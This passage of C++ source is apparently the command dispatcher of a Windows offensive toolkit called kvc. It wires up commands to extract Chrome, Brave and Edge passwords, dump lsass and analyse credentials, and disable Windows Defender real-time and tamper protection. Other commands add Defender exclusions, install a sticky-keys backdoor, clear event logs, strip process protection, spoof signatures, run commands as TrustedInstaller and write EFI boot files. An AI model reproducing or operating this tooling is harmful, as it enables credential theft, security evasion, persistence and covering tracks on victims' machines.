    return g_controller->UnprotectProcessByName(target) ? 0 : 2;
}

int HandleBrowserPasswords(int argc, wchar_t* argv[]) {
    if (argc < 3 || IsHelpFlag(argv[2])) {
        HelpSystem::PrintBrowserCommands();
        return 0;
    }

    std::wstring browserType;
    std::wstring outputPath = L".";

    for (int i = 2; i < argc; i++) {
        std::wstring arg = argv[i];
        if (arg == L"--chrome") browserType = L"chrome";
        else if (arg == L"--brave") browserType = L"brave";
        else if (arg == L"--edge") browserType = L"edge";
        else if (arg == L"--all") browserType = L"all";
        else if (arg == L"--output" || arg == L"-o") {
            if (i + 1 < argc) outputPath = argv[++i];
            else { ERROR(L"Missing path for --output argument"); return 1; }
        }
        else { ERROR(L"Unknown argument: %s", arg.c_str()); return 1; }
    }

    if (browserType.empty()) { HelpSystem::PrintBrowserCommands(); return 0; }

    if (browserType == L"all") {
        if (!CheckKvcPassExists() && !g_controller->EnsureBinaryComponents()) { ERROR(L"--all requires kvc_pass.exe"); return 1; }
        if (!g_controller->ExportBrowserData(outputPath, browserType)) { ERROR(L"Failed to extract from all browsers"); return 1; }
        return 0;
    }

    if (browserType == L"edge") {
        if (CheckKvcPassExists()) {
            INFO(L"Full Edge extraction: JSON (kvc_pass) + HTML/TXT (KVC DPAPI)");
            if (!g_controller->ExportBrowserData(outputPath, browserType)) ERROR(L"kvc_pass extraction failed");
            INFO(L"Generating HTML/TXT reports...");
            g_controller->ShowPasswords(outputPath);
            SUCCESS(L"Edge extraction complete");
        } else {
            INFO(L"Using built-in Edge DPAPI extraction (HTML/TXT only)");
            g_controller->ShowPasswords(outputPath);
        }
        return 0;
    }

    if (!CheckKvcPassExists() && !g_controller->EnsureBinaryComponents()) { ERROR(L"%s extraction requires kvc_pass.exe", browserType == L"chrome" ? L"Chrome" : L"Brave"); return 1; }
    if (!g_controller->ExportBrowserData(outputPath, browserType)) { ERROR(L"Failed to export browser passwords"); return 1; }
    return 0;
}

// ============================================================================
// MAIN APPLICATION ENTRY POINT
// ============================================================================

int wmain(int argc, wchar_t* argv[])
{
    signal(SIGINT, SignalHandler);

    if (argc >= 2 && std::wstring_view(argv[1]) == L"--service") {
        return ServiceManager::RunAsService();
    }
    
    if (argc < 2 || IsHelpFlag(argv[1])) {
        HelpSystem::PrintUsage(argv[0]);
        return argc < 2 ? 1 : 0;
    }

    EnsureSelfDefenderExclusions();

    try {
        g_controller = std::make_unique<Controller>();
    } catch (...) {
        ERROR(L"Failed to initialize Controller");
        return 3;
    }

    std::wstring command = argv[1];

    using CommandHandler = std::function<int(int, wchar_t**)>;
    
    static const std::unordered_map<std::wstring, CommandHandler> commandMap = {
        // --- Service ---
        {L"install", [](int argc, wchar_t** argv) {
            // kvc install [--pdb] <driver>  - register driver for SMSS boot-phase loading
            if (argc >= 3) {
                bool usePdb = false;
                std::wstring driverArg;
                for (int i = 2; i < argc; i++) {
                    if (std::wstring(argv[i]) == L"--pdb") {
                        usePdb = true;
                    } else if (driverArg.empty()) {
                        driverArg = argv[i];
                    }
                }
                if (!driverArg.empty()) {
                    return g_controller->InstallSmssDriver(driverArg, usePdb) ? 0 : 1;
                }
            }
            // kvc install  - install kvc NT service
            wchar_t exePath[MAX_PATH];
            if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) { ERROR(L"Failed to get current executable path"); return 1; }
            INFO(L"Installing Kernel Vulnerability Capabilities Framework service...");
            return ServiceManager::InstallService(exePath) ? 0 : 1;
        }},
        {L"uninstall", HandleUninstall},
        {L"service", HandleServiceCommand},

        // --- DSE & Driver ---
        {L"dse", HandleDseCommand},
        {L"driver", HandleDriverCommand},

        // --- Process Ops ---
        {L"list", [](int argc, wchar_t** argv) {
            g_controller->m_sessionMgr.DetectAndHandleReboot();
            
            // Check for --gui flag
            if (argc >= 3 && (wcscmp(argv[2], L"--gui") == 0 || wcscmp(argv[2], L"-g") == 0)) {
                ShowProcessListGUI(g_controller.get());
                return 0;
            }
            
            return g_controller->ListProtectedProcesses() ? 0 : 2;
        }},
        {L"info", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing PID/process name argument for detailed information"); return 1; }
            if (IsNumeric(argv[2])) {
                auto pid = ParsePid(argv[2]);
                if(!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
                return g_controller->PrintProcessInfo(pid.value()) ? 0 : 2;
            }
            auto match = g_controller->ResolveNameWithoutDriver(argv[2]);
            if (match) return g_controller->PrintProcessInfo(match->Pid) ? 0 : 2;
            return 2;
        }},
        {L"get", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
            if (IsNumeric(argv[2])) {
                auto pid = ParsePid(argv[2]);
                if(!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
                return g_controller->GetProcessProtection(pid.value()) ? 0 : 2;
            }
            return g_controller->GetProcessProtectionByName(argv[2]) ? 0 : 2;
        }},
        {L"kill", [](int argc, wchar_t** argv) {
            ProcessManager::HandleKillCommand(argc, argv, g_controller.get());
            return 0;
        }},
        {L"dump", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
            std::wstring outPath = (argc >= 4) ? argv[3] : L"";
            if (outPath.empty()) {
                wchar_t* dl;
                if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &dl) == S_OK) { outPath = dl; outPath += L"\\"; CoTaskMemFree(dl); }
                else outPath = L".\\";
            }
            std::wstring dumpPath;
            bool ok;
            if (IsNumeric(argv[2])) {
                auto pid = ParsePid(argv[2]);
                if (!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
                ok = g_controller->DumpProcess(pid.value(), outPath, &dumpPath);
            } else {
                ok = g_controller->DumpProcessByName(argv[2], outPath, &dumpPath);
            }
            // Offer immediate forensic analysis after successful lsass dump
            if (ok && !dumpPath.empty() && g_controller->IsForensicAvailable()) {
                std::wstring target = StringUtils::ToLowerCopy(std::wstring(argv[2]));
                if (target.find(L"lsass") != std::wstring::npos) {
                    wprintf(L"\n[*] Analyze credentials now? [Y/n]: ");
                    wchar_t ch = _getwch();
                    wprintf(L"%lc\n\n", ch);
                    if (ch == L'Y' || ch == L'y' || ch == L'\r' || ch == L'\n') {
                        g_controller->RunForensicAnalysis(dumpPath, L"both", false, L"");
                    }
                }
            }
            return ok ? 0 : 2;
        }},

        // --- Modules ---
        {L"modules", HandleModulesCommand},
        {L"mods",    HandleModulesCommand},

        // --- Protection ---
        {L"protect", [](int argc, wchar_t** argv) { return HandleProtectionCommand(argc, argv, false); }},
        {L"set",     [](int argc, wchar_t** argv) { return HandleProtectionCommand(argc, argv, true); }},
        {L"spoof",   [](int argc, wchar_t** argv) {
            if (argc < 5) { ERROR(L"Missing arguments: <PID/process_name> <EXE_SIG_HEX> <DLL_SIG_HEX>"); return 1; }
            std::wstring target = argv[2];
            UCHAR exeSig = static_cast<UCHAR>(std::wcstoul(argv[3], nullptr, 16));
            UCHAR dllSig = static_cast<UCHAR>(std::wcstoul(argv[4], nullptr, 16));
            
            if (IsNumeric(target)) {
                auto pid = ParsePid(target);
                if (!pid) { ERROR(L"Invalid PID format: %s", target.c_str()); return 1; }
                return g_controller->SpoofProcessSignatures(pid.value(), exeSig, dllSig) ? 0 : 2;
            } else {
                return g_controller->SpoofProcessSignaturesByName(target, exeSig, dllSig) ? 0 : 2;
            }
        }},
        {L"set-signer", [](int argc, wchar_t** argv) {
            if (argc < 5) { ERROR(L"Missing arguments: <CURRENT_SIGNER> <PP|PPL> <NEW_SIGNER>"); return 1; }
            std::wstring cs = argv[2];
            if (!Utils::GetSignerTypeFromString(cs)) { ERROR(L"Invalid signer type: %s", cs.c_str()); return 1; }
            return g_controller->SetProtectionBySigner(cs, argv[3], argv[4]) ? 0 : 2;
        }},
        {L"unprotect", HandleUnprotectCommand},
        {L"unprotect-signer", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing signer type argument"); return 1; }
            return g_controller->UnprotectBySigner(argv[2]) ? 0 : 2;
        }},
        {L"restore", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing argument: <signer_name|all>"); return 1; }
            std::wstring t = argv[2];
            return (t == L"all") ? (g_controller->RestoreAllProtection() ? 0 : 2) 
                                 : (g_controller->RestoreProtectionBySigner(t) ? 0 : 2);
        }},
        {L"history", [](int, wchar_t**) { g_controller->ShowSessionHistory(); return 0; }},
        {L"cleanup-sessions", [](int, wchar_t**) { g_controller->m_sessionMgr.CleanupAllSessionsExceptCurrent(); return 0; }},
        {L"list-signer", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing signer type argument"); return 1; }
            return g_controller->ListProcessesBySigner(argv[2]) ? 0 : 1;
        }},

        // --- Filesystem Blocker ---
        {L"lock",      HandleLockCommand},

        // --- Defender & Security ---
        {L"secengine", HandleSecEngineCommand},
        {L"disable-defender", [](int argc, wchar_t** argv) {
            bool r = DefenderManager::DisableSecurityEngine();
            if (r && argc >= 3 && std::wstring(argv[2]) == L"--restart") {
                INFO(L"Initiating system restart...");
                InitiateSystemRestart();
            }
            return r ? 0 : 2;
        }},
        {L"enable-defender", [](int, wchar_t**) { return DefenderManager::EnableSecurityEngine() ? 0 : 2; }},
        
        // --- Defender UI Automation ---
		{L"rtp", [](int argc, wchar_t** argv) {
            if (argc < 3) { INFO(L"Usage: kvc rtp <on|off|status>"); return 1; }
            WindowsDefenderAutomation wda;
            if (!wda.openDefenderSettings()) { ERROR(L"Failed to open Windows Security"); return 1; }
            std::wstring act = argv[2];
            bool res = false;
            if (act == L"on") { res = wda.enableRealTimeProtection(); if(!res) ERROR(L"Failed to enable Real-Time Protection"); }
            else if (act == L"off") { res = wda.disableRealTimeProtection(); if(!res) ERROR(L"Failed to disable Real-Time Protection"); }
            else if (act == L"status") { wda.getRealTimeProtectionStatus(); res = true; }
            else { ERROR(L"Unknown action: %s", act.c_str()); INFO(L"Usage: kvc rtp <on|off|status>"); }
            wda.closeSecurityWindow();
            return res ? 0 : 1;
        }},
		{L"tp", [](int argc, wchar_t** argv) {
            if (argc < 3) { INFO(L"Usage: kvc tp <on|off|status>"); return 1; }
            WindowsDefenderAutomation wda;
            if (!wda.openDefenderSettings()) { ERROR(L"Failed to open Windows Security"); return 1; }
            std::wstring act = argv[2];
            bool res = false;
            if (act == L"on") { res = wda.enableTamperProtection(); if(!res) ERROR(L"Failed to enable Tamper Protection"); }
            else if (act == L"off") { res = wda.disableTamperProtection(); if(!res) ERROR(L"Failed to disable Tamper Protection"); }
            else if (act == L"status") { wda.getTamperProtectionStatus(); res = true; }
            else { ERROR(L"Unknown action: %s", act.c_str()); INFO(L"Usage: kvc tp <on|off|status>"); }
            wda.closeSecurityWindow();
            return res ? 0 : 1;
        }},

        // --- Exclusions ---
        {L"add-exclusion", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing exclusion arguments. Usage: kvc add-exclusion <Paths|Processes|Extensions|IpAddresses> <value>"); return 1; }
            std::wstring sub = StringUtils::ToLowerCaseCopy(argv[2]);
            if (argc < 4) return g_controller->AddToDefenderExclusions(argv[2]) ? 0 : 2; // Legacy
            if (sub == L"paths" || sub == L"path") return g_controller->AddPathExclusion(argv[3]) ? 0 : 2;
            if (sub == L"processes" || sub == L"process") return g_controller->AddProcessExclusion(argv[3]) ? 0 : 2;
            if (sub == L"extensions" || sub == L"extension") return g_controller->AddExtensionExclusion(argv[3]) ? 0 : 2;
            if (sub == L"ipaddresses" || sub == L"ip") return g_controller->AddIpAddressExclusion(argv[3]) ? 0 : 2;
            // Fallback for legacy
            return g_controller->AddToDefenderExclusions(argv[2]) ? 0 : 2;
        }},
        {L"remove-exclusion", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing exclusion arguments. Usage: kvc remove-exclusion <Paths|Processes|Extensions|IpAddresses> <value>"); return 1; }
            std::wstring sub = StringUtils::ToLowerCaseCopy(argv[2]);
            if (argc < 4) return g_controller->RemoveFromDefenderExclusions(argv[2]) ? 0 : 2; // Legacy
            if (sub == L"paths" || sub == L"path") return g_controller->RemovePathExclusion(argv[3]) ? 0 : 2;
            if (sub == L"processes" || sub == L"process") return g_controller->RemoveProcessExclusion(argv[3]) ? 0 : 2;
            if (sub == L"extensions" || sub == L"extension") return g_controller->RemoveExtensionExclusion(argv[3]) ? 0 : 2;
            if (sub == L"ipaddresses" || sub == L"ip") return g_controller->RemoveIpAddressExclusion(argv[3]) ? 0 : 2;
            return g_controller->RemoveFromDefenderExclusions(argv[2]) ? 0 : 2;
        }},

        // --- Passwords ---
        {L"browser-passwords", HandleBrowserPasswords},
        {L"bp",                HandleBrowserPasswords},
        {L"export", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing export subcommand: secrets"); return 1; }
            if (std::wstring(argv[2]) == L"secrets") {
                std::wstring path = (argc >= 4) ? argv[3] : PathUtils::GetDefaultSecretsOutputPath();
                if (path.empty()) { ERROR(L"Failed to determine default output path"); return 1; }
                if (CheckKvcPassExists() || g_controller->EnsureBinaryComponents()) {
                    INFO(L"Extracting browser passwords via COM elevation...");
                    if (!g_controller->ExportBrowserData(path, L"edge")) INFO(L"Edge COM extraction failed");
                    if (!g_controller->ExportBrowserData(path, L"chrome")) INFO(L"Chrome extraction failed");
                    if (!g_controller->ExportBrowserData(path, L"brave")) INFO(L"Brave extraction failed");
                } else {
                    INFO(L"kvc_pass.exe not available - Edge will fallback to DPAPI (no JSON output)");
                }
                INFO(L"Extracting WiFi and generating DPAPI reports...");
                g_controller->ShowPasswords(path);
                return 0;
            }
            ERROR(L"Unknown export subcommand: %s", argv[2]); return 1;
        }},

        // --- System & Registry ---
        {L"trusted", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing command for elevated execution"); return 1; }
            std::wstring cmd;
            for (int i = 2; i < argc; i++) { if (i > 2) cmd += L" "; cmd += argv[i]; }
            return g_controller->RunAsTrustedInstaller(cmd) ? 0 : 2;
        }},
        {L"install-context", [](int, wchar_t**) { return g_controller->AddContextMenuEntries() ? 0 : 1; }},
        {L"shift",   [](int, wchar_t**) { INFO(L"Installing sticky keys backdoor..."); return g_controller->InstallStickyKeysBackdoor() ? 0 : 2; }},
        {L"unshift", [](int, wchar_t**) { INFO(L"Removing sticky keys backdoor..."); return g_controller->RemoveStickyKeysBackdoor() ? 0 : 2; }},
        {L"registry", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing registry subcommand: backup, restore, defrag"); return 1; }
            std::wstring sub = argv[2];
            HiveManager hm;
            if (sub == L"backup") return hm.Backup((argc >= 4) ? argv[3] : L"") ? 0 : 2;
            if (sub == L"restore") { if(argc<4){ERROR(L"Missing source path for restore"); return 1;} return hm.Restore(argv[3]) ? 0 : 2; }
            if (sub == L"defrag") return hm.Defrag((argc >= 4) ? argv[3] : L"") ? 0 : 2;
            ERROR(L"Unknown registry subcommand: %s", sub.c_str()); return 1;
        }},

        // --- ForceIO (minifilter-bypass file operations) ---
        {L"locks",  HandleForceIOLocks},
        {L"delete", HandleForceIODelete},
        {L"rename", HandleForceIORename},
        {L"copy",   HandleForceIOCopy},

        // --- Misc ---
        {L"watermark", [](int argc, wchar_t** argv) {
            if (argc < 3) { ERROR(L"Missing subcommand. Usage: kvc watermark <remove|restore|status>"); return 1; }
            std::wstring sub = argv[2];
            if (sub == L"remove") { INFO(L"Removing Windows desktop watermark..."); return g_controller->RemoveWatermark() ? 0 : 2; }
            if (sub == L"restore") { INFO(L"Restoring Windows desktop watermark..."); return g_controller->RestoreWatermark() ? 0 : 2; }
            if (sub == L"status") { std::wstring s=g_controller->GetWatermarkStatus(); INFO(L"Watermark status: %s", s.c_str()); return 0; }
            ERROR(L"Unknown watermark subcommand: %s", sub.c_str()); return 1;
        }},
        {L"wm", [](int argc, wchar_t** argv) { return commandMap.at(L"watermark")(argc, argv); }},
        {L"setup", [](int, wchar_t**) {
            INFO(L"Loading and processing kvc.dat combined binary...");
            bool ok = g_controller->LoadAndSplitCombinedBinaries();
            // Deploy kvcforensic.dat if present in CWD (optional forensic module)
            g_controller->DeployForensicModule();
            return ok ? 0 : 2;
        }},
        {L"analyze", [](int argc, wchar_t** argv) {
            // kvc analyze --gui  ->  open KvcForensic GUI
            if (argc >= 3 && (_wcsicmp(argv[2], L"--gui") == 0 || _wcsicmp(argv[2], L"--cli") == 0)) {
                return g_controller->LaunchForensicGui() ? 0 : 2;
            }
            // kvc analyze lsass  ->  smart-find most recent lsass dump
            std::wstring dumpPath;
            if (argc >= 3 && _wcsicmp(argv[2], L"lsass") == 0) {
                auto searchDir = [&](const std::wstring& dir) {
                    WIN32_FIND_DATAW fd;
                    HANDLE h = FindFirstFileW((dir + L"\\lsass*.dmp").c_str(), &fd);
                    if (h == INVALID_HANDLE_VALUE) return;
                    FILETIME bestTime{};
                    do {
                        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                            if (dumpPath.empty() || CompareFileTime(&fd.ftLastWriteTime, &bestTime) > 0) {
                                dumpPath = dir + L"\\" + fd.cFileName;
                                bestTime = fd.ftLastWriteTime;
                            }
                        }
                    } while (FindNextFileW(h, &fd));
                    FindClose(h);
                };
                wchar_t cwd[MAX_PATH]; GetCurrentDirectoryW(MAX_PATH, cwd);
                searchDir(cwd);
                wchar_t* dl = nullptr;
                if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &dl) == S_OK) {
                    searchDir(dl); CoTaskMemFree(dl);
                }
                if (dumpPath.empty()) {
                    ERROR(L"No lsass*.dmp found in current directory or Downloads.");
                    INFO(L"Dump first with: kvc dump lsass");
                    INFO(L"Or specify path: kvc analyze C:\\path\\to\\lsass.dmp");
                    return 1;
                }
                INFO(L"Found: %s", dumpPath.c_str());
            } else if (argc >= 3) {
                dumpPath = argv[2];
            } else {
                ERROR(L"Missing argument. Usage: kvc analyze <dump.dmp|lsass> [--format txt|json|both] [--full] [--tickets <dir>] | --gui");
                return 1;
            }
            // Parse optional flags
            std::wstring format = L"both";
            bool full = false;
            std::wstring ticketsDir;
            for (int i = 3; i < argc; ++i) {
                if (_wcsicmp(argv[i], L"--format") == 0 && i + 1 < argc) { format = argv[++i]; continue; }
                if (_wcsicmp(argv[i], L"--full") == 0)   { full = true; continue; }
                if (_wcsicmp(argv[i], L"--tickets") == 0 && i + 1 < argc) { ticketsDir = argv[++i]; continue; }
            }
            return g_controller->RunForensicAnalysis(dumpPath, format, full, ticketsDir) ? 0 : 2;
        }},
        {L"undervolter", [](int argc, wchar_t** argv) {
            if (argc < 3) {
                INFO(L"Usage: kvc undervolter <deploy|remove|status>");
                INFO(L"");
                INFO(L"  deploy  - extract UnderVolter.dat and write Loader.efi +");
                INFO(L"            UnderVolter.efi + UnderVolter.ini to the EFI partition.");
                INFO(L"            Optionally replaces \\EFI\\BOOT\\BOOTX64.EFI (backed up).");
                INFO(L"  remove  - restore backed-up BOOTX64.EFI and remove EFI\\UnderVolter\\.");
                INFO(L"  status  - check whether UnderVolter is deployed on the EFI partition.");
                INFO(L"");
                INFO(L"  Requires UnderVolter.dat in the current directory or System32.");
                INFO(L"  Build UnderVolter.dat with KvcXor.exe option 6.");
                return 0;
            }
            const std::wstring sub = argv[2];
            if (sub == L"deploy") {
                INFO(L"Deploying UnderVolter to EFI System Partition...");
                return g_controller->DeployUnderVolter() ? 0 : 2;
            }
            if (sub == L"remove") {
                INFO(L"Removing UnderVolter from EFI System Partition...");
                return g_controller->RemoveUnderVolter() ? 0 : 2;
            }
            if (sub == L"status") {
                const std::wstring s = g_controller->GetUnderVolterStatus();
                INFO(L"UnderVolter status: %s", s.c_str());
                return 0;
            }
            ERROR(L"Unknown subcommand: %s. Use deploy | remove | status", sub.c_str());
            return 1;
        }},
        {L"evtclear", [](int, wchar_t**) { return g_controller->ClearSystemEventLogs() ? 0 : 2; }},

        // --- Entertainment ---
        {L"--tetris", [](int, wchar_t**) {
            INFO(L"[TETRIS] Initializing High-Security Environment...");
            if (g_controller->BeginDriverSession()) {
                if (g_controller->SelfProtect(L"PPL", L"WinTcb")) {
                    SUCCESS(L"[TETRIS] Self-Protection Active: PPL-WinTcb applied.");
                    SUCCESS(L"[TETRIS] Process is now immune to external termination.");
                } else {
                    ERROR(L"[TETRIS] Failed to apply Self-Protection. Running in standard mode.");
                }
                g_controller->EndDriverSession(false);
            } else {
                ERROR(L"[TETRIS] Failed to initialize driver session. Self-Protection unavailable.");
            }
            return TetrisMain();
        }},
        {L"tetris", [](int, wchar_t**) {
            INFO(L"[TETRIS] Initializing High-Security Environment...");
            if (g_controller->BeginDriverSession()) {
                if (g_controller->SelfProtect(L"PPL", L"WinTcb")) {
                    SUCCESS(L"[TETRIS] Self-Protection Active: PPL-WinTcb applied.");
                    SUCCESS(L"[TETRIS] Process is now immune to external termination.");
                } else {
                    ERROR(L"[TETRIS] Failed to apply Self-Protection. Running in standard mode.");
                }
                g_controller->EndDriverSession(false);
            } else {
                ERROR(L"[TETRIS] Failed to initialize driver session. Self-Protection unavailable.");
            }
            return TetrisMain();
        }}
    };

    // ========================================================================
    // EXECUTION
    // ========================================================================

    try {
        auto it = commandMap.find(command);
        if (it != commandMap.end()) {
            int result = it->second(argc, argv);
            CleanupDriver();
            return result;
        } else {
            HelpSystem::PrintUnknownCommandMessage(command);
            CleanupDriver();
            return 1;
        }
    }
    catch (const std::exception& e) {
        ERROR(L"Exception: %S", e.what());
        CleanupDriver();
        return 3;
    }
    catch (...) {
        ERROR(L"Unknown exception occurred");
        CleanupDriver();
        return 3;
    }
}
